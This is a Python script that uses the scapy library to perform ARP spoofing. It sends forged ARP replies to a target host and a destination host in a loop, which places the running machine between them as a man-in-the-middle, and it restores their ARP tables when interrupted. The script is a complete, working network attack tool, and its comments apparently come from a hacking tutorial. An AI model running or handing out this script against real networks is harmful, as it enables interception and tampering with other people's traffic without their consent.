#!/usr/bin/env python

import scapy.all as scapy
import time, sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", dest="target", help="Specify the target IP.")
    parser.add_argument("-d", "--destination", dest="destination", help="Specify the destination IP.")
    (options) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    elif not options.destination:
        parser.error("[-] Please specify a destination IP, use --help for more info.")

    return options


# getting the MAC for the IP address that we are defining
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # let's define the target MAC from the get_mac()
    target_mac = get_mac(target_ip)

    # creating ARP packet and storing content of the packet in a variable called packet
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# restoring settings to the previous state
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    # we set the op=2 as this is the ARP response, op=1 is ARP request
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    # fyi verbose false means that no information is sent on command
    scapy.send(packet, count=4, verbose=False)


get_options = get_arguments()
target_ip_addr = get_options.target
destination_ip_addr = get_options.destination

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip_addr, destination_ip_addr)
        spoof(destination_ip_addr, target_ip_addr)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
    restore(target_ip_addr, destination_ip_addr)
    restore(destination_ip_addr, target_ip_addr)
